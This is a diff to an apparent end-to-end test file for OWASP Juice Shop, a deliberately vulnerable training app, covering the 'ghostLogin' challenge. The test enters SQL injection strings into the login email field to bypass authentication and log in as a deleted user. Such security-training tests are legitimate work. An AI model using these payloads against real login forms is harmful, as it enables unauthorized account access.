@@ -154,17 +154,17 @@ describe('/#/login', () => {
 
   describe('challenge "ghostLogin"', () => {
     it('should be able to log in as chris.pike@juice-sh.op by using `\' or deletedAt IS NOT NULL --`', () => {
-      email.sendKeys('\' or deletedAt IS NOT NULL --')
+      email.sendKeys('\' or deletedAt IS NOT NULL--')
       password.sendKeys('a')
       loginButton.click()
     })
 
     it('should be able to log in as chris.pike@juice-sh.op by using `chris.pike@juice-sh.op\' --`', () => {
-      email.sendKeys('chris.pike@juice-sh.op\' --')
+      email.sendKeys('chris.pike@juice-sh.op\'--')
       password.sendKeys('a')
       loginButton.click()
     })
 
-    protractor.expect.challengeSolved({ challenge: 'Ghost Login' })
+    protractor.expect.challengeSolved({ challenge: 'GDPR Compliance Tier 2' })
   })
 })
